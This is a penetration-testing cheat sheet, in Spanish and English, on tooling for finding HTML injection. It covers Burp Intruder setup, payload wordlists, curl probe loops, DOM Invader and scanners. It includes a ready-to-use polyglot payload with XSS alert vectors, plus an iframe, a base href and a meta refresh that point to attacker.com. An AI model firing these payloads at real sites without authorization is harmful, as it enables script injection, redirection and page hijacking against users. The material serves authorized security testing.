---
aliases:
  - HTML Injection Tooling
  - HTML Injection Wordlists
  - Burp DOM Invader
tags:
  - vuln/html-injection
  - technique/discovery
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[HTML Injection]]"
  - "[[Burp Suite]]"
---
# HTML Injection - Tooling

---

## Burp Intruder con HTML Wordlists

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp Intruder → set `§...§` position en reflected param → Sniper attack | Single position multi-payload brute | Standard. |
| Burp Intruder Payload Type "Simple list" → load `seclists/Fuzzing/XSS/XSS-Polyglots-LeoGuti2020.txt` | Polyglot wordlist for HTML/XSS | Polyglot. |
| Burp Intruder Options → Grep Match `<b>TEST</b>` to identify rendered | Grep match rendered marker | Validation. |
| Burp Intruder Options → Grep Extract regex `(<[^>]*>)+` post-injection | Extract rendered HTML | Result inspect. |
| Burp Intruder Filter Length column ≠ baseline | Sort by Length diff | Visual diff. |
| Burp Intruder Filter Status `200` | Filter to success codes | Standard. |
| Burp Intruder Payload Processing → "URL-encode key characters" | Auto-encode special chars | Match server. |
| Burp BApp Store → "Reflected Parameters" install | Detect reflected params passively | Passive scan. |
| Burp BApp Store → "Backslash Powered Scanner" install | Active scan diff-based | Active fuzz. |
| Right-click request → "Scan" → "Open scan launcher" → Active Scan | Built-in active scanner | Pro feature. |
| Burp Intruder Resource Pool concurrent=5, throttle=200ms | Pacing to avoid lockout | Anti-rate-limit. |
| Burp Intruder File → Save attack state | Save state for resume | Long attack. |
^htmli-tool-burp-intruder

---

## PayloadsAllTheThings - HTML Injection

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `git clone https://github.com/swisskyrepo/PayloadsAllTheThings && cat 'PayloadsAllTheThings/HTML Injection/README.md'` | PayloadsAllTheThings HTML Injection compendium | Foundation. |
| `wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/HTML%20Injection/Intruder/htmli-intruder.txt` | HTML inj Intruder wordlist | Burp Intruder load. |
| `ls /usr/share/seclists/Fuzzing/XSS/` | SecLists XSS lists (overlap HTML inj) | Foundation lists. |
| `cat /usr/share/seclists/Fuzzing/XSS/XSS-Bypass-Strings-Mike-Iacovacci.txt` | WAF bypass strings | Bypass payloads. |
| `wget https://github.com/payloadbox/xss-payload-list/raw/master/Intruder/xss-payload-list.txt` | xss-payload-list 5000+ payloads | Volume. |
| `cat /usr/share/seclists/Fuzzing/Polyglots/XSS-Polyglots-LeoGuti2020.txt` | Polyglot multi-context | Single-shot probe. |
| `python3 -c "tags=['a','img','form','iframe','style','base','meta','link','svg','input']; [print(f'<{t}>') for t in tags]"` | Quick top-tags probe generator | Quick set. |
| `wget https://github.com/EdOverflow/can-i-take-over-xyz/raw/master/README.md` | Email/subdomain takeover patterns | Email vector. |
| `curl https://raw.githubusercontent.com/cure53/H5SC/master/cheatsheet.json \| jq -r '.[]'` | H5SC HTML5 Security Cheatsheet payloads | HTML5-specific. |
| Burp Intruder Payload Type "Simple list" → load downloaded wordlist | Load wordlist into Intruder | Workflow. |
^htmli-tool-wordlists

### Quick HTML inj polyglot

```
<b>POLYGLOT-MARKER</b><img src=x onerror=alert(1)><svg onload=alert(2)><iframe src="//attacker.com/log"></iframe><base href="//attacker.com/"><meta http-equiv="refresh" content="0;url=//attacker.com">
```

---

## Manual Review (Input/Output Mapping)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -s 'https://target/search?q=HTMLINJ_<b>TEST</b>' \| grep -E '<b>TEST</b>\|&lt;b&gt;TEST&lt;/b&gt;'` | Probe rendered vs escaped | Standard probe. |
| `for p in '<b>X</b>' '<img src=x>' '<svg>x</svg>' '<iframe>' '<style>x</style>' '<base href=//y/>' '<meta http-equiv=refresh>'; do E=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$p'))"); echo "[$p]"; curl -s "https://target/search?q=$E" \| grep -oE "$p" \| head -1; done` | Bulk tag probe loop | Discovery loop. |
| `curl -s 'https://target/?in=A<B>C' \| grep -E 'A<B>C\|A&lt;B&gt;C'` | Reflection vs escape detection | Quick probe. |
| `curl -s -X POST -d 'text=<b>STORED-MARKER</b>' https://target/comments && curl -s https://target/comments \| grep STORED-MARKER` | Stored injection probe | Stored detect. |
| `view-source:https://target/search?q=<b>TEST</b>` (browser) | Manual raw HTML view | Browser feature. |
| Burp Logger++ → Filter `response.matches("HTMLINJ_MARKER")` | Filter responses by reflected marker | Passive. |
| Burp Comparer → load 2 responses → "Compare words" | Diff escape vs raw | Diff visual. |
| Burp BApp Store → "Reflector" install | Auto-highlight reflected params | Passive scan. |
| `curl -s 'https://target/?q=<img src=https://canary.oast.fun/x>'` luego check Collaborator | Out-of-band probe Collaborator | OOB validation. |
| `curl -s 'https://target/?in=ABC123MARKER' \| grep -oE 'ABC123MARKER[^"]*'` | Context detect surrounding | Per-context. |
| DevTools Inspector → Elements panel → Ctrl+F search injected marker | Live DOM context inspect | Real-time. |
^htmli-tool-manual-review

### Workflow manual

```bash
# 1. Send input con marker
curl -s 'https://target/search?q=HTMLINJ_<b>x</b>' > response.html

# 2. Check if rendered or escaped
grep -E '<b>x</b>|&lt;b&gt;x&lt;/b&gt;' response.html

# 3. Test bypass payloads progressively
for p in '<b>X</b>' '<img src=x>' '<svg>' '<iframe>' '<style>' '<base>' '<meta>'; do
  ENCODED=$(printf '%s' "$p" | jq -sRr @uri)
  R=$(curl -s "https://target/search?q=$ENCODED")
  echo "Payload: $p"
  echo "$R" | grep -oE "$p" | head
done
```

---

## DOM Invader (Burp DOM-side Tools)

| **Herramienta / Acción** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp Pro → top-right → "DOM Invader" → Enable | Enable DOM Invader extension | Built-in. |
| DOM Invader → Settings → "Inject canaries" enable | Auto-inject markers into all sources | Auto-probe. |
| DOM Invader → "Sources" tab | Identify user-input sources (URL, hash, cookies, postMessage) | Source enum. |
| DOM Invader → "Sinks" tab | Identify innerHTML/eval sinks | Sink enum. |
| DOM Invader → "Stack trace" view per sink | Trace source-to-sink path | Visual chain. |
| DOM Invader → "Click to test" button | Auto-test marker payload | Quick verify. |
| DOM Invader → "postMessage" tab → enable listener log | Cross-origin postMessage detect | postMessage vuln. |
| DOM Invader → "Prototype Pollution" tab → scan | PP detect adjacent vuln | Adjacent. |
| Right-click finding → "Send to Repeater" → manual test | Send to Repeater for replay | Workflow. |
| Right-click finding → "Save to issues" | Save to Burp issues | Reportable. |
^htmli-tool-dom-invader

---

## Otros Tools y Scripts

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `go install github.com/hahwul/dalfox/v2/cmd/dalfox@latest && dalfox url https://target/search?q=test` | Dalfox XSS/HTMLi scanner | Modern Go scanner. |
| `python3 XSStrike.py -u "https://target/search?q=test"` | XSStrike advanced fuzzer | Adaptive scanner. |
| `cat urls.txt \| kxss` | kxss reflected param detector | Bulk recon. |
| `cat urls.txt \| gxss -p test` | Gxss reflection prober | Bulk recon alt. |
| `nuclei -t http/vulnerabilities/ -u https://target -tags xss,htmli` | Nuclei tag filter HTMLi | Templates tag. |
| `python3 -c "from bs4 import BeautifulSoup; s=BeautifulSoup(open('resp.html'), 'html.parser'); print([t for t in s.find_all() if 'MARKER' in str(t)])"` | BeautifulSoup parse inject detect | Custom Python. |
| `playwright codegen https://target/search` | Playwright record interactions | Modern headless. |
| `npx puppeteer-test "https://target/search?q=<svg onload=alert(1)>"` | Puppeteer test render | Headless probe. |
| `python3 selenium_probe.py` (con `driver.find_elements_by_xpath('//*[contains(text(), "MARKER")]')`) | Selenium DOM probe | Older headless. |
| `zaproxy -cmd -port 8080 -quickurl https://target -quickprogress` | OWASP ZAP CLI scan | Free alt. |
| `dalfox file urls.txt -o report.json -F` | Dalfox bulk + JSON report | Bulk + report. |
| `python3 -c "import requests; r=requests.get('https://target/?q=<HTMLINJ>'); print('<HTMLINJ>' in r.text)"` | DIY Python probe | Quick check. |
^htmli-tool-others

---
